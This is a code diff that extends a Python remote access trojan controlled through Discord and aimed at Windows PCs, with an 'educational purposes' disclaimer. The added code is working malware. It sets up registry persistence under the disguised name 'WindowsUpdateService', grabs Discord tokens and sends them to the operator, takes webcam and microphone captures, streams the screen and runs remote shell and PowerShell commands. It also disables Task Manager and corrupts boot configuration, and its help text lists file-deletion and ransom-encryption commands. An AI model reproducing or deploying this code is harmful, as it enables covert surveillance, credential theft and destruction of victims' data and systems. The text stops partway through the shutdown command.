@@ -1,4 +1,4 @@
-# mytemplate.py - Your Custom RAT Template
+# mytemplate.py - Advanced RAT Template with ALL Features
 # Disclaimer: This is only for entertainment and educational purposes.
 # I am not responsible for what you do with it or any consequences.
 # Made by Neek :3
@@ -28,6 +28,9 @@ import requests
 import winreg
 import base64
 import atexit
+import shutil
+import json
+import webbrowser
 
 if platform.system() != "Windows":
     sys.exit(0)
@@ -70,19 +73,78 @@ intents.message_content = True
 bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
 bot.remove_command("help")
 
-# ========== STARTUP FUNCTION ==========
+# ========== GLOBAL VARIABLES ==========
+STREAMING = False
+STREAM_TASK = None
+
+# ========== STARTUP FUNCTION (FIXED - WORKS WITH EXE) ==========
 def add_to_startup():
+    """Add the RAT to Windows startup registry"""
     try:
-        app_path = sys.executable
+        # Get the current executable path
+        if getattr(sys, 'frozen', False):
+            # Running as compiled .exe
+            app_path = sys.executable
+        else:
+            # Running as .py script
+            app_path = os.path.abspath(__file__)
+        
+        # Make sure it's a valid path
+        if not os.path.exists(app_path):
+            return False
+        
+        # Open the Run registry key
         key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\Run",
             0,
             winreg.KEY_SET_VALUE
         )
-        winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, app_path)
+        
+        # Use a legitimate-looking name
+        startup_name = "WindowsUpdateService"
+        
+        # Add quotes around the path if it has spaces
+        if ' ' in app_path:
+            app_path = f'"{app_path}"'
+        
+        winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, app_path)
         winreg.CloseKey(key)
+        
+        # Also try to add to HKLM (requires admin)
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_LOCAL_MACHINE,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0,
+                winreg.KEY_SET_VALUE
+            )
+            winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, app_path)
+            winreg.CloseKey(key)
+        except:
+            pass  # Admin rights required, fallback to HKCU
+        
         return True
+    except Exception as e:
+        print(f"Startup add error: {e}")
+        return False
+
+def is_in_startup():
+    """Check if RAT is in startup registry"""
+    try:
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_READ
+        )
+        try:
+            value, _ = winreg.QueryValueEx(key, "WindowsUpdateService")
+            winreg.CloseKey(key)
+            return True
+        except:
+            winreg.CloseKey(key)
+            return False
     except:
         return False
 
@@ -257,6 +319,42 @@ def get_wifipasswords():
         profiles.append({'name': 'Error retrieving WiFi', 'password': 'N/A'})
     return profiles
 
+def get_default_browser():
+    """Detect the default browser on the system"""
+    try:
+        if platform.system() == "Windows":
+            browsers = [
+                ('chrome', r'C:\Program Files\Google\Chrome\Application\chrome.exe'),
+                ('chrome', r'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'),
+                ('firefox', r'C:\Program Files\Mozilla Firefox\firefox.exe'),
+                ('firefox', r'C:\Program Files (x86)\Mozilla Firefox\firefox.exe'),
+                ('edge', r'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'),
+                ('edge', r'C:\Program Files\Microsoft\Edge\Application\msedge.exe'),
+                ('brave', r'C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe'),
+                ('brave', r'C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe'),
+                ('opera', r'C:\Program Files\Opera\opera.exe'),
+                ('opera', r'C:\Program Files (x86)\Opera\opera.exe'),
+            ]
+            
+            for name, path in browsers:
+                if os.path.exists(path):
+                    return name, path
+            
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r'HTTP\shell\open\command')
+                command = winreg.QueryValue(key, None)
+                winreg.CloseKey(key)
+                if command:
+                    path = command.split('"')[1] if '"' in command else command.split(' ')[0]
+                    if os.path.exists(path):
+                        return 'default', path
+            except:
+                pass
+            
+        return 'unknown', 'start'
+    except:
+        return 'unknown', 'start'
+
 # ========== AUTHORIZATION CHECK ==========
 def is_authorized():
     async def auth(ctx):
@@ -280,16 +378,30 @@ async def send_embed(ctx, title, description, color=discord.Color.blue()):
 # ========== EVENT HANDLERS ==========
 @bot.event
 async def on_ready():
-    await bot.get_channel(Config.MAIN_CHANNEL).send(f"<@{Config.WHITELISTED[0]}>")
-
-    user = get_displayname()
-
-    embed = discord.Embed(
-        title="✅ Bot Online",
-        description=f"Prefix: `{Config.PREFIX}`\nUser: **`{user}`**\nType `{Config.PREFIX}help`",
-        color=discord.Color.green()
-    )
-    await bot.get_channel(Config.MAIN_CHANNEL).send(embed=embed)
+    # ADD TO STARTUP IMMEDIATELY
+    if Config.STARTUP:
+        add_to_startup()
+    
+    channel = bot.get_channel(Config.MAIN_CHANNEL)
+    if channel:
+        await channel.send(f"<@{Config.WHITELISTED[0]}>")
+        
+        user = get_displayname()
+        
+        # Check if startup was successful
+        startup_status = "✅" if is_in_startup() else "❌"
+        
+        embed = discord.Embed(
+            title="✅ Bot Online",
+            description=(
+                f"Prefix: `{Config.PREFIX}`\n"
+                f"User: **`{user}`**\n"
+                f"Startup: {startup_status}\n"
+                f"Type `{Config.PREFIX}help`"
+            ),
+            color=discord.Color.green()
+        )
+        await channel.send(embed=embed)
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -322,6 +434,8 @@ async def cmd_help(ctx):
         ],
         "System Info": [
             "`info` - Get advanced system information",
+            "`ip` - Get public IP address",
+            "`sysinfo` - Quick system summary",
         ],
         "Destructive": [
             "`lock` - Locks PC",
@@ -330,35 +444,65 @@ async def cmd_help(ctx):
             "`filedestroy` - Deletes all personal files",
             "`fileransom` - Encrypts all files",
             "`virus` - Fake virus messages",
+            "`killprocess [name]` - Kill a process",
+            "`disabletaskmgr` - Disable Task Manager",
+            "`enabletaskmgr` - Enable Task Manager",
+            "`destroyboot` - Corrupt boot files (⚠️ DANGEROUS)",
         ],
         "Messages": [
             "`voice [message]` - Text-to-speech message",
             "`msgbox [message]` - Message box popup",
-            "`rickroll` - Opens Rickroll video",
+            "`rickroll` - Opens Rickroll in their browser",
+            "`alarm [seconds]` - Sound an alarm",
+            "`notify [message]` - Send Windows notification",
         ],
         "Control": [
             "`screenshot [name]` - Take screenshot",
+            "`screenshare` - Start screen sharing",
+            "`stopscreenshare` - Stop screen sharing",
             "`open <app>` - Open application",
             "`close <app>` - Close application",
             "`listapps [limit]` - List running apps",
-            "`cmd [command]` - Run a cmd command"
+            "`cmd [command]` - Run a cmd command",
+            "`powershell [command]` - Run PowerShell command",
+            "`webcam` - Take webcam photo",
+            "`micrecord [seconds]` - Record microphone",
+            "`tokens` - Grab Discord tokens from PC",
         ],
         "Mouse & Keyboard": [
             "`click [left|right|middle]` - Mouse click",
-            "`press <keys>` - Press keys (ex: ctrl+c)"
+            "`press <keys>` - Press keys (ex: ctrl+c)",
+            "`type [text]` - Type text",
+            "`move [x] [y]` - Move mouse",
+            "`scroll [amount]` - Scroll",
+            "`doubleclick` - Double click",
+            "`rightclick` - Right click",
+            "`getpos` - Get mouse position",
         ],
         "Power Control": [
             "`shutdown [delay]` - Shutdown PC",
             "`restart [delay]` - Restart PC",
+            "`sleep` - Put PC to sleep",
+            "`logoff` - Log off user",
         ],
         "Media": [
             "`playpause` - Play/Pause media",
-            "`nexttrack` - Next track"
+            "`nexttrack` - Next track",
+            "`prevtrack` - Previous track",
+            "`volumeup` - Volume up",
+            "`volumedown` - Volume down",
+            "`mute` - Mute volume",
         ],
         "Files": [
-            "`listfiles [directory]` - List files"
+            "`listfiles [directory]` - List files",
+            "`download [filepath]` - Download file",
+            "`deletefile [filepath]` - Delete a file",
+            "`createfile [name] [content]` - Create a file",
         ],
         "Bot": [
+            "`startup` - Check startup status",
+            "`addstartup` - Add to startup",
+            "`clearchat [amount]` - Delete bot messages",
             "`exit` - Closes the rat and exits."
         ],
         "Credits": [
@@ -370,6 +514,32 @@ async def cmd_help(ctx):
         embed.add_field(name=category, value="\n".join(commands), inline=False)
     
     await ctx.send(embed=embed)
+
+# ========== STARTUP MANAGEMENT COMMANDS ==========
+
+@bot.command(name='startup')
+@is_authorized()
+async def cmd_startup(ctx):
+    """Check if RAT is in startup"""
+    try:
+        if is_in_startup():
+            await send_embed(ctx, "✅ Startup Status", "RAT is in startup registry and will run on boot.", discord.Color.green())
+        else:
+            await send_embed(ctx, "❌ Startup Status", "RAT is NOT in startup registry. Use `addstartup` to add it.", discord.Color.red())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='addstartup')
+@is_authorized()
+async def cmd_addstartup(ctx):
+    """Add RAT to startup (persistence)"""
+    try:
+        if add_to_startup():
+            await send_embed(ctx, "✅ Startup Added", "RAT has been added to startup registry. It will run when the PC boots.", discord.Color.green())
+        else:
+            await send_embed(ctx, "❌ Startup Failed", "Failed to add to startup. Try running as admin.", discord.Color.red())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
 
 # ========== SYSTEM INFO COMMANDS ==========
 
@@ -442,12 +612,107 @@ async def cmd_info(ctx):
     except Exception as e:
         await send_embed(ctx, "Info Error", f"Failed to get system info: {str(e)}", discord.Color.red())
 
+@bot.command(name='sysinfo')
+@is_authorized()
+async def cmd_sysinfo(ctx):
+    """Quick system summary"""
+    try:
+        info = get_ipinfo()
+        embed = discord.Embed(
+            title="⚡ Quick System Info",
+            color=discord.Color.blue()
+        )
+        embed.add_field(name="User", value=get_displayname(), inline=True)
+        embed.add_field(name="OS", value=f"{platform.system()} {platform.release()}", inline=True)
+        embed.add_field(name="CPU", value=f"{psutil.cpu_percent()}%", inline=True)
+        embed.add_field(name="RAM", value=f"{psutil.virtual_memory().percent}%", inline=True)
+        embed.add_field(name="IP", value=info['ip'], inline=True)
+        embed.add_field(name="Host", value=platform.node(), inline=True)
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+# ========== TOKEN TAKER COMMAND ==========
+
+@bot.command(name='tokens')
+@is_authorized()
+async def cmd_tokens(ctx):
+    """Grab Discord tokens from the victim's PC"""
+    try:
+        await send_embed(ctx, "🔑 Token Grabber", "Searching for Discord tokens...", discord.Color.gold())
+        
+        found_tokens = []
+        token_patterns = [
+            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
+            r'mfa\.[\w-]{84}',
+        ]
+        
+        paths = [
+            os.path.expandvars(r'%APPDATA%\Discord\Local Storage\leveldb'),
+            os.path.expandvars(r'%APPDATA%\DiscordCanary\Local Storage\leveldb'),
+            os.path.expandvars(r'%APPDATA%\DiscordPTB\Local Storage\leveldb'),
+            os.path.expandvars(r'%APPDATA%\Lightcord\Local Storage\leveldb'),
+            os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
+            os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb'),
+            os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb'),
+            os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\Local Storage\leveldb'),
+            os.path.expandvars(r'%APPDATA%\Vivaldi\Local Storage\leveldb'),
+        ]
+        
+        for path in paths:
+            if os.path.exists(path):
+                try:
+                    for file in os.listdir(path):
+                        if file.endswith('.log') or file.endswith('.ldb'):
+                            file_path = os.path.join(path, file)
+                            try:
+                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                    content = f.read()
+                                    for pattern in token_patterns:
+                                        matches = re.findall(pattern, content)
+                                        for match in matches:
+                                            if match not in found_tokens:
+                                                found_tokens.append(match)
+                            except:
+                                pass
+                except:
+                    pass
+        
+        if found_tokens:
+            embed = discord.Embed(
+                title="🔑 Tokens Found!",
+                color=discord.Color.gold()
+            )
+            
+            token_list = ""
+            for i, token in enumerate(found_tokens[:10]):
+                masked = token[:8] + "..." + token[-4:]
+                token_list += f"`{masked}`\n"
+            
+            embed.add_field(name=f"Found {len(found_tokens)} token(s)", value=token_list, inline=False)
+            
+            if len(found_tokens) > 0:
+                with open('tokens_found.txt', 'w') as f:
+                    for token in found_tokens:
+                        f.write(token + '\n')
+                
+                await ctx.send(file=discord.File('tokens_found.txt'))
+                os.remove('tokens_found.txt')
+                
+                embed.set_footer(text="Tokens saved and sent as file")
+            
+            await ctx.send(embed=embed)
+        else:
+            await send_embed(ctx, "🔑 Token Grabber", "No Discord tokens found on this system.", discord.Color.orange())
+            
+    except Exception as e:
+        await send_embed(ctx, "Token Error", f"Failed to grab tokens: {str(e)}", discord.Color.red())
+
 # ========== DESTRUCTIVE COMMANDS ==========
 
 @bot.command(name='lock')
 @is_authorized()
 async def cmd_lock(ctx):
-    """Lock the PC"""
     try:
         ctypes.windll.user32.LockWorkStation()
         await send_embed(ctx, "🔒 PC Locked", "Workstation has been locked.", discord.Color.orange())
@@ -457,7 +722,6 @@ async def cmd_lock(ctx):
 @bot.command(name='crash')
 @is_authorized()
 async def cmd_crash(ctx):
-    """Blue screen of death"""
     try:
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
@@ -465,10 +729,68 @@ async def cmd_crash(ctx):
     except:
         await send_embed(ctx, "BSOD Failed", "Could not trigger blue screen.", discord.Color.red())
 
+@bot.command(name='killprocess')
+@is_authorized()
+async def cmd_killprocess(ctx, *, process_name: str):
+    try:
+        killed = 0
+        for proc in psutil.process_iter(['pid', 'name']):
+            if process_name.lower() in proc.info['name'].lower():
+                proc.kill()
+                killed += 1
+        if killed > 0:
+            await send_embed(ctx, "Process Killed", f"Killed **{killed}** process(es) matching **{process_name}**", discord.Color.red())
+        else:
+            await send_embed(ctx, "Process Not Found", f"No process found matching **{process_name}**", discord.Color.orange())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='disabletaskmgr')
+@is_authorized()
+async def cmd_disabletaskmgr(ctx):
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        await send_embed(ctx, "Task Manager Disabled", "Task Manager has been disabled!", discord.Color.red())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='enabletaskmgr')
+@is_authorized()
+async def cmd_enabletaskmgr(ctx):
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(key)
+        await send_embed(ctx, "Task Manager Enabled", "Task Manager has been enabled!", discord.Color.green())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='destroyboot')
+@is_authorized()
+async def cmd_destroyboot(ctx):
+    await send_embed(ctx, "⚠️ WARNING", "This will corrupt boot files! Type 'YES' to confirm", discord.Color.dark_red())
+    
+    def check(m):
+        return m.author == ctx.author and m.content == "YES"
+    
+    try:
+        await bot.wait_for('message', timeout=30, check=check)
+        if os.name == "nt":
+            os.system('bcdedit /export C:\\boot_backup.bak')
+            os.system('bcdedit /deletevalue {default} path')
+            await send_embed(ctx, "💀 Boot Files Corrupted", "System will not boot on restart!", discord.Color.dark_red())
+        else:
+            await send_embed(ctx, "Error", "Only works on Windows!", discord.Color.red())
+    except asyncio.TimeoutError:
+        await send_embed(ctx, "Cancelled", "Command timed out", discord.Color.orange())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
 @bot.command(name='filescramble')
 @is_authorized()
 async def cmd_filescramble(ctx):
-    """Rename all files randomly in personal folders"""
     try:
         folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
         scrambled = 0
@@ -497,7 +819,6 @@ async def cmd_filescramble(ctx):
 @bot.command(name='filedestroy')
 @is_authorized()
 async def cmd_filedestroy(ctx):
-    """Delete all personal files"""
     try:
         folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
         deleted = 0
@@ -523,7 +844,6 @@ async def cmd_filedestroy(ctx):
 @bot.command(name='fileransom')
 @is_authorized()
 async def cmd_fileransom(ctx):
-    """Encrypt all files in personal folders"""
     try:
         folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
         encrypted = 0
@@ -554,13 +874,20 @@ async def cmd_fileransom(ctx):
 @bot.command(name='virus')
 @is_authorized()
 async def cmd_virus(ctx):
-    """Display fake virus messages"""
     try:
         await send_embed(ctx, "Virus Alert", "Displaying fake virus messages on screen", discord.Color.red())
         
-        for x in range(0, 10):
-            msg = "WARNING! This device is filled with viruses. Pay $234,324,214 in crypto. You have 24 hours."
+        messages = [
+            "WARNING! This device is filled with viruses!",
+            "Pay $234,324,214 in crypto within 24 hours!",
+            "All your files will be deleted if you don't pay!",
+            "You have been hacked! Your data is encrypted!",
+            "Sending all your files to the dark web..."
+        ]
+        
+        for msg in messages:
             subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{msg}')" """, shell=True, capture_output=True, text=True)
+            time.sleep(1)
     except Exception as e:
         await send_embed(ctx, "Virus Error", f"Failed to display virus messages: {str(e)}", discord.Color.red())
 
@@ -569,7 +896,6 @@ async def cmd_virus(ctx):
 @bot.command(name='voice')
 @is_authorized()
 async def cmd_voice(ctx, *, message: str):
-    """Text-to-speech message"""
     try:
         engine = pyttsx3.init()
         engine.say(message)
@@ -581,20 +907,60 @@ async def cmd_voice(ctx, *, message: str):
 @bot.command(name='msgbox')
 @is_authorized()
 async def cmd_msgbox(ctx, *, message: str):
-    """Display message box popup"""
     try:
         subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{message}')" """, shell=True, capture_output=True, text=True)
         await send_embed(ctx, "Message Box", f"Displayed message box: **{message}**", discord.Color.blue())
     except Exception as e:
         await send_embed(ctx, "Message Error", f"Failed to display message box: {str(e)}", discord.Color.red())
 
+@bot.command(name='notify')
+@is_authorized()
+async def cmd_notify(ctx, *, message: str):
+    try:
+        subprocess.run(f'powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\'); $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Process -Id $pid).Path); $notify.BalloonTipText = \'{message}\'; $notify.BalloonTipTitle = \'System Alert\'; $notify.Visible = $true; $notify.ShowBalloonTip(5000)"', shell=True)
+        await send_embed(ctx, "Notification Sent", f"**{message}**", discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Notify Error", str(e), discord.Color.red())
+
+@bot.command(name='alarm')
+@is_authorized()
+async def cmd_alarm(ctx, duration: int = 5):
+    try:
+        await send_embed(ctx, "🔔 Alarm", f"Ringing for {duration} seconds", discord.Color.orange())
+        for i in range(duration):
+            ctypes.windll.kernel32.Beep(1000, 500)
+            await asyncio.sleep(1)
+        await send_embed(ctx, "Alarm Done", "Alarm finished!", discord.Color.green())
+    except Exception as e:
+        await send_embed(ctx, "Alarm Error", str(e), discord.Color.red())
+
 @bot.command(name='rickroll')
 @is_authorized()
 async def cmd_rickroll(ctx):
-    """Open Rickroll video"""
     try:
-        subprocess.Popen(f'start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ', shell=True)
-        await send_embed(ctx, "🎵 Rickroll Activated", "Never gonna give you up!", discord.Color.gold())
+        browser_name, browser_path = get_default_browser()
+        
+        rickrolls = [
+            'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+            'https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=43s',
+            'https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s',
+        ]
+        url = random.choice(rickrolls)
+        
+        if browser_name == 'unknown':
+            webbrowser.open(url)
+            await send_embed(ctx, "🎵 Rickroll Activated", f"Opened in default browser: {url}", discord.Color.gold())
+        else:
+            subprocess.Popen([browser_path, url])
+            await send_embed(ctx, "🎵 Rickroll Activated", f"Opened in **{browser_name.title()}**!", discord.Color.gold())
+            
+        try:
+            engine = pyttsx3.init()
+            engine.say("Never gonna give you up, never gonna let you down!")
+            engine.runAndWait()
+        except:
+            pass
+            
     except Exception as e:
         await send_embed(ctx, "Error", f"Failed to open rickroll: {str(e)}", discord.Color.red())
 
@@ -603,7 +969,6 @@ async def cmd_rickroll(ctx):
 @bot.command(name='screenshot')
 @is_authorized()
 async def cmd_screenshot(ctx, name: Optional[str] = None):
-    """Take a screenshot"""
     try:
         filename = name if name else f"screenshot_{int(time.time())}.png"
         screenshot = pyautogui.screenshot()
@@ -618,10 +983,108 @@ async def cmd_screenshot(ctx, name: Optional[str] = None):
     except Exception as e:
         await send_embed(ctx, "Screenshot Error", f"Failed: {str(e)}", discord.Color.red())
 
+@bot.command(name='screenshare')
+@is_authorized()
+async def cmd_screenshare(ctx):
+    global STREAMING, STREAM_TASK
+    
+    if STREAMING:
+        await send_embed(ctx, "Already Streaming", "Screen sharing is already active!", discord.Color.orange())
+        return
+    
+    STREAMING = True
+    await send_embed(ctx, "📺 Screen Share Started", "Sending screenshots every 2 seconds. Use `stopscreenshare` to stop.", discord.Color.green())
+    
+    async def stream_screen():
+        while STREAMING:
+            try:
+                screenshot = pyautogui.screenshot()
+                filename = f"stream_{int(time.time())}.png"
+                screenshot.save(filename)
+                await ctx.send(file=discord.File(filename))
+                os.remove(filename)
+                await asyncio.sleep(2)
+            except:
+                break
+    
+    STREAM_TASK = asyncio.create_task(stream_screen())
+
+@bot.command(name='stopscreenshare')
+@is_authorized()
+async def cmd_stopscreenshare(ctx):
+    global STREAMING, STREAM_TASK
+    
+    if not STREAMING:
+        await send_embed(ctx, "Not Streaming", "No active screen share to stop.", discord.Color.orange())
+        return
+    
+    STREAMING = False
+    if STREAM_TASK:
+        STREAM_TASK.cancel()
+    await send_embed(ctx, "⏹️ Screen Share Stopped", "Screen sharing has been stopped.", discord.Color.red())
+
+@bot.command(name='webcam')
+@is_authorized()
+async def cmd_webcam(ctx):
+    try:
+        import cv2
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        if ret:
+            cv2.imwrite("webcam.jpg", frame)
+            await ctx.send(file=discord.File("webcam.jpg"))
+            os.remove("webcam.jpg")
+            await send_embed(ctx, "📸 Webcam Photo", "Webcam photo captured!", discord.Color.green())
+        else:
+            await send_embed(ctx, "Webcam Error", "Could not access webcam", discord.Color.red())
+        cap.release()
+    except Exception as e:
+        await send_embed(ctx, "Webcam Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='micrecord')
+@is_authorized()
+async def cmd_micrecord(ctx, duration: int = 5):
+    try:
+        import pyaudio
+        import wave
+        
+        await send_embed(ctx, "🎤 Recording", f"Recording for {duration} seconds...", discord.Color.blue())
+        
+        CHUNK = 1024
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 1
+        RATE = 44100
+        RECORD_SECONDS = duration
+        
+        p = pyaudio.PyAudio()
+        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+        frames = []
+        
+        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+            data = stream.read(CHUNK)
+            frames.append(data)
+        
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        
+        filename = f"recording_{int(time.time())}.wav"
+        wf = wave.open(filename, 'wb')
+        wf.setnchannels(CHANNELS)
+        wf.setsampwidth(p.get_sample_size(FORMAT))
+        wf.setframerate(RATE)
+        wf.writeframes(b''.join(frames))
+        wf.close()
+        
+        await ctx.send(file=discord.File(filename))
+        os.remove(filename)
+        await send_embed(ctx, "✅ Recording Complete", f"Recorded {duration} seconds", discord.Color.green())
+    except Exception as e:
+        await send_embed(ctx, "Mic Error", f"Failed: {str(e)}", discord.Color.red())
+
 @bot.command(name='open')
 @is_authorized()
 async def cmd_open(ctx, *, app_name: str):
-    """Open an application"""
     try:
         app_map = {
             'notepad': 'notepad.exe',
@@ -633,6 +1096,7 @@ async def cmd_open(ctx, *, app_name: str):
             'vscode': 'code.exe',
             'discord': 'discord.exe',
             'spotify': 'spotify.exe',
+            'steam': 'steam.exe',
         }
 
         app_to_open = app_map.get(app_name.lower(), app_name)
@@ -644,7 +1108,6 @@ async def cmd_open(ctx, *, app_name: str):
 @bot.command(name='close')
 @is_authorized()
 async def cmd_close(ctx, *, app_name: str):
-    """Close an application"""
     try:
         closed = False
         for proc in psutil.process_iter(['pid', 'name']):
@@ -662,7 +1125,6 @@ async def cmd_close(ctx, *, app_name: str):
 @bot.command(name='listapps')
 @is_authorized()
 async def cmd_listapps(ctx, limit: int = 15):
-    """List running applications"""
     try:
         windows = gw.getAllTitles()
         active_windows = [win for win in windows if win]
@@ -683,10 +1145,9 @@ async def cmd_listapps(ctx, limit: int = 15):
 @bot.command(name='cmd')
 @is_authorized()
 async def cmd_cmd(ctx, *, command: str):
-    """Run a CMD command"""
     try:
         await send_embed(ctx, "Command Executing", f"Running command: **{command}**", discord.Color.dark_grey())
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
         output = result.stdout if result.stdout else result.stderr
         if len(output) > 1900:
             output = output[:1900] + "..."
@@ -697,15 +1158,37 @@ async def cmd_cmd(ctx, *, command: str):
             color=discord.Color.dark_grey()
         )
         await ctx.send(embed=embed)
+    except subprocess.TimeoutExpired:
+        await send_embed(ctx, "Command Error", "Command timed out!", discord.Color.red())
     except Exception as e:
         await send_embed(ctx, "Command Error", f"Failed to run command: {str(e)}", discord.Color.red())
+
+@bot.command(name='powershell')
+@is_authorized()
+async def cmd_powershell(ctx, *, command: str):
+    try:
+        await send_embed(ctx, "PowerShell Executing", f"Running: **{command}**", discord.Color.dark_grey())
+        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, timeout=30)
+        output = result.stdout if result.stdout else result.stderr
+        if len(output) > 1900:
+            output = output[:1900] + "..."
+        
+        embed = discord.Embed(
+            title="⚡ PowerShell Output",
+            description=f"```\n{output}\n```",
+            color=discord.Color.dark_grey()
+        )
+        await ctx.send(embed=embed)
+    except subprocess.TimeoutExpired:
+        await send_embed(ctx, "PowerShell Error", "Command timed out!", discord.Color.red())
+    except Exception as e:
+        await send_embed(ctx, "PowerShell Error", f"Failed: {str(e)}", discord.Color.red())
 
 # ========== MOUSE & KEYBOARD COMMANDS ==========
 
 @bot.command(name='click')
 @is_authorized()
 async def cmd_click(ctx, button: str = 'left'):
-    """Mouse click - !click [left|right|middle]"""
     try:
         button = button.lower()
         if button == 'left':
@@ -725,19 +1208,71 @@ async def cmd_click(ctx, button: str = 'left'):
 @bot.command(name='press')
 @is_authorized()
 async def cmd_press(ctx, *, key_combo: str):
-    """Press keys - !press [keys] (ex: ctrl+c)"""
     try:
         pyautogui.hotkey(*key_combo.split('+'))
         await send_embed(ctx, "Keys Pressed", f"Pressed: **{key_combo}**", discord.Color.blue())
     except Exception as e:
         await send_embed(ctx, "Press Error", f"Failed to press keys: {str(e)}", discord.Color.red())
 
+@bot.command(name='type')
+@is_authorized()
+async def cmd_type(ctx, *, text: str):
+    try:
+        pyautogui.typewrite(text)
+        await send_embed(ctx, "Typing", f"Typed: **{text[:50]}**", discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Type Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='move')
+@is_authorized()
+async def cmd_move(ctx, x: int, y: int):
+    try:
+        pyautogui.moveTo(x, y)
+        await send_embed(ctx, "Mouse Moved", f"Moved to ({x}, {y})", discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Move Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='scroll')
+@is_authorized()
+async def cmd_scroll(ctx, amount: int):
+    try:
+        pyautogui.scroll(amount)
+        await send_embed(ctx, "Scrolled", f"Scrolled **{amount}** clicks", discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Scroll Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='doubleclick')
+@is_authorized()
+async def cmd_doubleclick(ctx):
+    try:
+        pyautogui.doubleClick()
+        await send_embed(ctx, "Double Click", "Performed double click", discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Click Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='rightclick')
+@is_authorized()
+async def cmd_rightclick(ctx):
+    try:
+        pyautogui.rightClick()
+        await send_embed(ctx, "Right Click", "Performed right click", discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Click Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='getpos')
+@is_authorized()
+async def cmd_getpos(ctx):
+    try:
+        pos = pyautogui.position()
+        await send_embed(ctx, "Mouse Position", f"**({pos.x}, {pos.y})**", discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Position Error", f"Failed: {str(e)}", discord.Color.red())
+
 # ========== POWER CONTROL COMMANDS ==========
 
 @bot.command(name='shutdown')
 @is_authorized()
 async def cmd_shutdown(ctx, delay: int = 60):
-    """Shutdown PC with delay"""
     try:
         if delay < 10:
